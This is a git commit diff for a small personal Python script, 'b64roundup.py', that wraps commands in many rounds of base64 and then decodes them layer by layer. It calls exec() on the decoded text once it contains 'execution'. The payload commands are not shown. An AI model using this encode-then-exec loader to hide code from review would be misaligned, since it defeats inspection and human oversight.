3a753893fcc450514143596223b1f39ac430aa74
a1c43my <sk8flowtheengineer@outlook.com>
2022-03-05 10:39:53 -0600

    Update b64roundup.py

--- fun stuff/b64roundup.py
+++ fun stuff/b64roundup.py
@@ -1,6 +1,5 @@
 from itsdangerous import base64_decode, base64_encode
 
-
 def t1(list,r):
     t = list
     while r < 20: 
@@ -17,9 +16,7 @@ def t2(rounded):
         g = base64_decode(rounded)
         if str(g).__contains__('execution'): 
             exec(g)
-            #rounded=str(base64_decode(g)); 
             found = True; 
-            #return rounded,tt
         else: 
             tt+=1
             rounded = g
@@ -33,15 +30,6 @@ cmd_lst.append(cmd1)
 cmd_lst.append(cmd2)
 cmd_lst.append(cmd3)
 cmd_lst.append(cmd4)
-
-#print('{} {} {} {}'.format(t1(cmd1),cmd2,cmd3,cmd4))
-#exec(base64_decode(t1(cmd1)))
-
-#print(t2(cmd1))
-#cmd1_ = t1(cmd1,3)
 cmd2_ = t1(cmd1,6)
-#print(ty)
-#print(t2(ty))
 
-#print(t2(cmd1_))
 t2(cmd2_)
